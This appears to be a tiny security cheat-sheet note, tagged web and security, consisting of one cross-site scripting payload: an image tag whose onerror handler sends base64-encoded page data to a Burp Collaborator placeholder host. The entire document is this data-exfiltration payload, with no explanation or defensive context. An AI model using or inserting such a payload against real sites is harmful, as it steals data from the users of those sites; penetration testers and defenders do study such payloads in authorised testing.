---
tags:
  - web
  - security
---
```js
<img src="x" onerror="location='//BURP_COLLABORATOR.oastify.com/?d='+btoa(DATA).slice(0,8000)">
```